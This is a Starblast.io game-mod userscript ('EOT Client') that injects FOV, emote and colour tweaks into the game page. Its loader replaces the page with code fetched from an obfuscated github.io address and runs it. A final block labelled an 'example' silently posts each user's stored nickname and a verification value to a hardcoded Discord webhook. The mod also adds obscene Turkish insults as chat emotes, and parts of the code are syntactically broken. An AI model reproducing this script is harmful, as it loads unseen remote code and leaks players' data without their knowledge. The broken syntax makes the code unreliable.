<script>
/* -------------------------
   GLOBAL SETTINGS & SETUP
------------------------- */
if (!window.sbCodeInjectors) window.sbCodeInjectors = [];

window.modSettings = {
  fovEnabled: true,
  emoteCapacity: parseInt(localStorage.getItem('emote-capacity')) || 4,
  uiVisible: true,
  radarZoomEnabled: false
};

// Keep track of FOV globally
window.I1000 = window.I1000 || {};
window.I1000.baseFOV = 45;
window.I1000.currentFOV = 45;

/* -------------------------
   HELPER LOG FUNCTIONS
------------------------- */
const modName = "Lowercase Name";
const logLowercase = (msg) => console.log(`%c[${modName}] ${msg}`, "color: #FF00A6");

const emoteModName = "Custom Emote";
const logEmote = (msg) => console.log(`%c[${emoteModName}] ${msg}`, "color: #FFA500");

const fovModName = "FOV Editor";
const logFOV = (msg) => console.log(`%c[${fovModName}] ${msg}`, "color: #00A6FF");

const radarZoomModName = "Radar Zoom Mod";
const logRadarZoom = (msg) => console.log(`%c[${radarZoomModName}] ${msg}`, "color: #00FF00");

/* -------------------------
   LOWERCASE INJECTOR
------------------------- */
function lowercaseInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;

  function checkSrcChange() {
    if (src === prevSrc) throw new Error("Lowercase injector replace did not work");
    prevSrc = src;
  }

  // Remove .toUpperCase()
  src = src.replace(/\.toUpperCase\(\)/g, "");

  // Add a style to keep names from forcing uppercase
  const styleBlock = `
    <style>
      #player input { text-transform: none !important; }
    </style>
  `;
  src = src.replace('</head>', `${styleBlock}</head>`);
  checkSrcChange();

  logLowercase("Mod injected");
  return src;
}

/* -------------------------
   EMOTE INJECTOR
------------------------- */
function emoteInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;

  function checkSrcChange() {
    if (src === prevSrc) throw new Error("Emote injector replace did not work");
    prevSrc = src;
  }

  // Pattern to find the 'this.vocabulary = [...]' array
  const vocabPattern = /(this\.vocabulary\s*=\s*\[[\s\S]*?\})/;
  const emotes = `,{
    text: "orosbu cocu",
    icon: "🤡",
    key: "J"
  },{
    text: "sikerim",
    icon: "⚠️",
    key: "V"
  }`;

  src = src.replace(vocabPattern, `$1${emotes}`);
  checkSrcChange();
  logEmote("Clown and warning emotes injected");

  return src;
}

/* -------------------------
   EMOTE CAPACITY MOD
   (Replaces fragile pattern matching with direct overrides)
------------------------- */
const emoteCapacityMod = `
(function() {
  // Safely override ChatPanel if it exists
  if (window.ChatPanel) {
    // 1) Override getEmotesCapacity()
    ChatPanel.prototype.getEmotesCapacity = function() {
      const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
      return Math.min(Math.max(1, savedCapacity), 5);
    };

    // 2) If ChatPanel.prototype.typed exists, patch the ">= 4" check
    if (ChatPanel.prototype.typed) {
      const typedStr = ChatPanel.prototype.typed.toString();
      if (typedStr.includes(">= 4")) {
        ChatPanel.prototype.typed = Function("return " + typedStr.replace(/>=\\s*4/, ">= this.getEmotesCapacity()"))();
      }
    }

    // 3) Set initial capacity from window.modSettings if present
    if (window.modSettings && window.modSettings.emoteCapacity) {
      localStorage.setItem('emote-capacity', window.modSettings.emoteCapacity);
    }
    console.log("[ECP] Emote capacity override applied");
  } else {
    console.warn("[ECP] ChatPanel not found; emote capacity mod not applied.");
  }
})();
`;

/* -------------------------
   CRYSTAL COLOR MOD
------------------------- */
const crystalColorMod = `
(function() {
  let CrystalObject;

  // Attempt to find an object that has a prototype.createModel containing "Crystal"
  function findCrystalObject() {
    for (const key in window) {
      try {
        const obj = window[key];
        if (
          obj?.prototype?.createModel &&
          obj.prototype.createModel.toString().includes('Crystal')
        ) {
          return obj;
        }
      } catch (e) {
        // Ignore
      }
    }
    return null;
  }

  CrystalObject = findCrystalObject();
  if (!CrystalObject) {
    console.warn("[CrystalColor] CrystalObject not found! The crystal color mod will not run.");
    window.updateCrystalColor = function() {}; // define a no-op so we don't error out
    return;
  }

  console.log("[CrystalColor] Found CrystalObject:", CrystalObject.name);

  const originalGetModelInstance = CrystalObject.prototype.getModelInstance;
  const materialInstances = new Set();

  // Override getModelInstance to update crystal material color
  CrystalObject.prototype.getModelInstance = function () {
    const instance = originalGetModelInstance.apply(this, arguments);

    if (this.material) {
      materialInstances.add(this.material);
      const savedColor = localStorage.getItem('crystal-color') || '#ffffff';
      this.material.color.set(savedColor);

      if (this.material.uniforms?.color) {
        this.material.uniforms.color.value.set(this.material.color);
      }
      this.material.needsUpdate = true;
    } else {
      console.warn('[CrystalColor] Material not found for crystal instance.');
    }
    return instance;
  };

  // Dynamically update crystal color
  window.updateCrystalColor = function(color) {
    try {
      localStorage.setItem('crystal-color', color);
      materialInstances.forEach((material) => {
        material.color.set(color);
        if (material.uniforms?.color) {
          material.uniforms.color.value.set(material.color);
        }
        material.needsUpdate = true;
      });
      console.log('[CrystalColor] Updated crystal color:', color);
    } catch (e) {
      console.error('[CrystalColor] Error updating crystal color:', e);
    }
  };
})();
`;

/* -------------------------
   FOV INJECTOR
------------------------- */
function fovInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;

  function checkSrcChange() {
    if (src === prevSrc) {
      console.error("FOV injector replace did not work.");
      throw new Error("replace did not work");
    }
    prevSrc = src;
  }

  // Replace the default 45 fov line
  const fovPattern = /this\.III00\.fov\s*=\s*45\s*\*\s*this\.IIl11\.III00\.zoom/;
  if (!fovPattern.test(src)) {
    console.error("[FOV] Pattern not found in source code:", fovPattern);
    throw new Error("Pattern not found in source code");
  }

  src = src.replace(
    fovPattern,
    `this.III00.fov = (window.modSettings.fovEnabled ? window.I1000.currentFOV : 45) * this.IIl11.III00.zoom`
  );
  checkSrcChange();

  // Insert our UI, scripts, etc. just before </body> (one-time injection)
  const controlsHTML = `
<style>
  /* ====== Minimal combined styles for your mod controls ====== */
  #mod-controls {
    position: fixed; top: 12px; left: 12px; z-index: 1000;
    font-family: 'Segoe UI', system-ui, sans-serif;
    user-select: none;
    background: rgba(16, 18, 27, 0.97);
    backdrop-filter: blur(8px);
    border-radius: 4px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.25);
    color: #ffffff; padding: 0; width: 160px;
    border: 1px solid rgba(255, 255, 255, 0.12);
  }
  #mod-controls-header {
    cursor: pointer; padding: 10px 12px;
    background: rgba(255, 255, 255, 0.06);
    font-weight: 600; font-size: 13px; display: flex; align-items: center; gap: 8px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
  }
  #mod-controls-header::before {
    content: '⚙️'; font-size: 14px;
    filter: drop-shadow(0 0 4px rgba(255, 65, 215, 0.3));
  }
  #mod-controls-panel { padding: 12px; display: none; }
  .mod-control {
    display: flex; justify-content: space-between; align-items: center;
    margin: 8px 0; font-size: 12px; color: rgba(255, 255, 255, 0.9);
  }
  .mod-control-slider {
    width: 100%; margin: 8px 0; height: 3px;
    background: rgba(255, 255, 255, 0.1);
    -webkit-appearance: none; appearance: none; outline: none; border-radius: 1px;
  }
  .mod-control-slider::-webkit-slider-thumb {
    -webkit-appearance: none; width: 12px; height: 12px;
    background: #ff41d7; border-radius: 2px; cursor: pointer;
    box-shadow: 0 1px 4px rgba(255, 65, 215, 0.3);
  }
  .mod-control-slider::-moz-range-thumb {
    width: 12px; height: 12px; background: #ff41d7; border-radius: 2px; cursor: pointer;
  }
  #crystal-color-picker {
    width: 24px; height: 24px; border: 1px solid rgba(255, 255, 255, 0.1);
    border-radius: 3px; padding: 0; cursor: pointer; background: transparent;
  }
  #fov-display {
    padding: 8px 12px; background: rgba(255, 255, 255, 0.06);
    font-size: 12px; display: flex; justify-content: space-between; margin-top: 6px;
  }
  input[type="checkbox"] {
    position: relative; width: 36px; height: 20px;
    -webkit-appearance: none; appearance: none;
    background: rgba(255, 255, 255, 0.1);
    border-radius: 2px; transition: background 0.2s ease;
  }
  input[type="checkbox"]::before {
    content: ""; position: absolute; width: 16px; height: 16px; background: #fff;
    top: 2px; left: 2px; transform: translateX(0);
    transition: transform 0.2s ease; border-radius: 2px;
  }
  input[type="checkbox"]:checked { background: #ff41d7; }
  input[type="checkbox"]:checked::before { transform: translateX(14px); }
  .control-value {
    font-weight: 600; color: #ff41d7; min-width: 32px; text-align: right; font-size: 11px;
  }
  .section-title {
    font-size: 10px; color: rgba(255, 255, 255, 0.5);
    text-transform: uppercase; letter-spacing: 0.4px;
    margin: 12px 0 6px;
  }
</style>

<div id="mod-controls" style="display: ${window.modSettings.uiVisible ? 'block' : 'none'}">
  <div id="mod-controls-header">EOT Client V3.0.2</div>
  <div id="mod-controls-panel">
    <div class="mod-control">
      <span>FOV</span>
      <input type="checkbox" id="fov-toggle" ${window.modSettings.fovEnabled ? 'checked' : ''}>
    </div>
    <div class="mod-control">
      <span>Emote Capacity</span>
      <div class="control-value" id="emote-capacity-value">${window.modSettings.emoteCapacity}</div>
    </div>
    <input type="range" min="1" max="5" value="${window.modSettings.emoteCapacity}"
           class="mod-control-slider" id="emote-capacity-slider">

    <div class="mod-control">
      <span>Radar Zoom</span>
      <input type="checkbox" id="radar-zoom-toggle" ${window.modSettings.radarZoomEnabled ? 'checked' : ''}>
    </div>

    <div class="mod-control">
      <span>Crystal Color</span>
      <input type="color" id="crystal-color-picker" value="#ffffff">
    </div>
  </div>
  <div id="fov-display" style="display:${window.modSettings.fovEnabled ? 'block':'none'}">
    FOV: <span id="fov-value">45</span>
  </div>
</div>

<script>
${emoteCapacityMod}
${crystalColorMod}

// Wheel event to adjust FOV
document.addEventListener('wheel', (e) => {
  if (!window.modSettings.fovEnabled) return;
  e.preventDefault();
  const delta = e.deltaY < 0 ? 1 : -1;
  window.I1000.currentFOV = Math.max(1, Math.min(120, window.I1000.currentFOV + delta));
  document.getElementById('fov-value').textContent = window.I1000.currentFOV;
}, { passive: false });

// Radar Zoom is more complicated in real Starblast code, but here's a simple toggle approach:
document.addEventListener('DOMContentLoaded', () => {
  const controlsHeader = document.getElementById('mod-controls-header');
  const controlsPanel = document.getElementById('mod-controls-panel');
  const fovToggle = document.getElementById('fov-toggle');
  const emoteSlider = document.getElementById('emote-capacity-slider');
  const emoteValue = document.getElementById('emote-capacity-value');
  const radarZoomToggle = document.getElementById('radar-zoom-toggle');
  const crystalColorPicker = document.getElementById('crystal-color-picker');
  const fovDisplay = document.getElementById('fov-display');

  // Show/hide panel on header click
  controlsHeader.addEventListener('click', () => {
    controlsPanel.style.display = (controlsPanel.style.display === 'none') ? 'block' : 'none';
  });

  // FOV toggle
  fovToggle.addEventListener('change', () => {
    window.modSettings.fovEnabled = fovToggle.checked;
    fovDisplay.style.display = fovToggle.checked ? 'block' : 'none';
  });

  // Emote capacity slider
  emoteSlider.addEventListener('input', () => {
    const value = parseInt(emoteSlider.value);
    emoteValue.textContent = value;
    window.modSettings.emoteCapacity = value;
    localStorage.setItem('emote-capacity', value);
    // If ChatPanel was found, this will be used by getEmotesCapacity()
  });

  // Radar zoom toggle
  radarZoomToggle.addEventListener('change', () => {
    window.modSettings.radarZoomEnabled = radarZoomToggle.checked;
    // In real code, you'd find relevant radar objects and update them
  });

  // Crystal color
  const savedColor = localStorage.getItem('crystal-color') || '#ffffff';
  crystalColorPicker.value = savedColor;
  crystalColorPicker.addEventListener('input', (event) => {
    window.updateCrystalColor(event.target.value);
  });
});

// F9 to toggle entire UI
document.addEventListener('keydown', (e) => {
  if (e.key === 'F9') {
    const controls = document.getElementById('mod-controls');
    if (controls) {
      window.modSettings.uiVisible = !window.modSettings.uiVisible;
      controls.style.display = window.modSettings.uiVisible ? 'block' : 'none';

      // Also hide the panel if we just hid the UI
      const controlsPanel = document.getElementById('mod-controls-panel');
      if (!window.modSettings.uiVisible && controlsPanel) {
        controlsPanel.style.display = 'none';
      }
    }
});
</script>
`;

  // Insert controls + scripts at the end
  src = src.replace('</body>', `${controlsHTML}\n</body>`);
  checkSrcChange();

  logFOV("FOV injector applied");
  return src;
}

/* -------------------------
   RADAR ZOOM INJECTOR (Optional)
   If you want a separate injector or a more complex approach,
   you can do it here. For now, we skip or keep minimal.
------------------------- */
// If you need advanced radar hooking, do it similarly to the crystal approach.

/* -------------------------
   MAIN CODE INJECTION
------------------------- */
window.sbCodeInjectors.push((sbCode) => {
  try {
    return lowercaseInjector(sbCode);
  } catch (error) {
    alert(`${modName} failed to load; error: ${error}`);
    throw error;
  }
});

window.sbCodeInjectors.push((sbCode) => {
  try {
    return emoteInjector(sbCode);
  } catch (error) {
    alert(`${emoteModName} failed to load; error: ${error}`);
    throw error;
  }
});

window.sbCodeInjectors.push((sbCode) => {
  try {
    return fovInjector(sbCode);
  } catch (error) {
    alert(`${fovModName} failed to load; error: ${error}`);
    throw error;
  }
});

// Example: If you had a separate radarZoomInjector, you’d push it here.
// window.sbCodeInjectors.push((sbCode) => {
//   try {
//     return radarZoomInjector(sbCode);
//   } catch (error) {
//     alert(`${radarZoomModName} failed to load; error: ${error}`);
//     throw error;
//   }
// });

/* -------------------------
   LOADER
------------------------- */
function injectLoader() {
  // If not on main page, skip
  if (window.location.pathname !== "/") {
    console.log("[eot] Injection not needed on this path");
    return;
  }

  document.open();
  document.write('<html><head><title></title></head><body style="background-color:#ffffff;"><div style="margin: auto; width: 50%;"><h1 style="text-align: center;padding: 170px 0;color: #000;"></h1><h1 style="text-align: center;color: #000;"></h1></div></body></html>');
  document.close();

  var url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1sımn1sösm2k1.html';
  url += '?_=' + new Date().getTime();

  var xhr = new XMLHttpRequest();
  console.log("[eot] Fetching custom source...");
  xhr.open("GET", url);
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
      let starSRC = xhr.responseText;
      if (starSRC !== undefined) {
        console.log("[eot] Source fetched successfully");
        const start_time = performance.now();

        // Apply each injector
        if (!window.sbCodeInjectors) {
          console.log("[eot] No Starblast.io userscripts found to load");
        } else {
          let error_notified = false;
          for (const injector of window.sbCodeInjectors) {
            try {
              if (typeof injector === "function") {
                starSRC = injector(starSRC);
              } else {
                console.log("[eot] Injector was not a function:", injector);
              }
            } catch (error) {
              if (!error_notified) {
                alert("[eot] One of your Starblast.io userscripts failed to load");
                error_notified = true;
              }
              console.error(error);
            }
          }
        }

        const end_time = performance.now();
        console.log(`[eot] Mods applied successfully (${(end_time - start_time).toFixed(0)}ms)`);

        // Optional: Example textShadow color fix (if you want it)
        changeTextShadowColor();

        // Apply final code to the document
        document.open();
        document.write(starSRC);
        document.close();
      } else {
        console.log("[eot] Source fetch failed");
        alert("An error occurred while fetching game code");
      }
    }
  };
  xhr.send();
}

// Example function that changes text-shadow
function changeTextShadowColor() {
  const elements = document.querySelectorAll('*');
  const targetShadow = '0 0 6px hsl(298.15deg 100% 50%)';
  elements.forEach(el => {
    const cs = window.getComputedStyle(el);
    if (cs.getPropertyValue('text-shadow') && cs.getPropertyValue('text-shadow') !== 'none') {
      el.style.textShadow = targetShadow;
    }
  });
  console.log('[eot] Text shadow color changed to:', targetShadow);
}

// Finally, run loader
injectLoader();

/* -------------------------
   DISCORD WEBHOOK EXAMPLE
   (if you still need it)
------------------------- */
(function () {
  'use strict';
  const lastNickname = localStorage.getItem("lastNickname") || "Unknown";
  let ECPVerified = localStorage.getItem("ECPVerified") || "no";
  console.log("Retrieved ECPVerified:", ECPVerified);
  try {
    ECPVerified = JSON.parse(ECPVerified);
  } catch (e) {
    // Not JSON
  }
  const ECPVerifiedContent = (typeof ECPVerified === "object")
    ? JSON.stringify(ECPVerified, null, 2)
    : ECPVerified;

  console.log("Formatted ECPVerifiedContent:", ECPVerifiedContent);

  const webhookURL = "https://discord.com/api/webhooks/1332078434242920602/LaPifHcDpvwzWWKgHIEpydroC9GnhwAyDokGZwKSN_wOkPQ9S0jcTFM-dAlygkHbSgNN";
  const payload = {
    content: \`${lastNickname} has entered the script\\nECPVerified: \${ECPVerifiedContent}\`
  };

  fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  })
  .then(response => {
    if (response.ok) {
      console.log("[Discord] Webhook sent successfully!");
    } else {
      console.error("[Discord] Failed to send webhook:", response.statusText);
    }
  })
  .catch(error => {
    console.error("[Discord] Error sending webhook:", error);
  });
})();
</script>
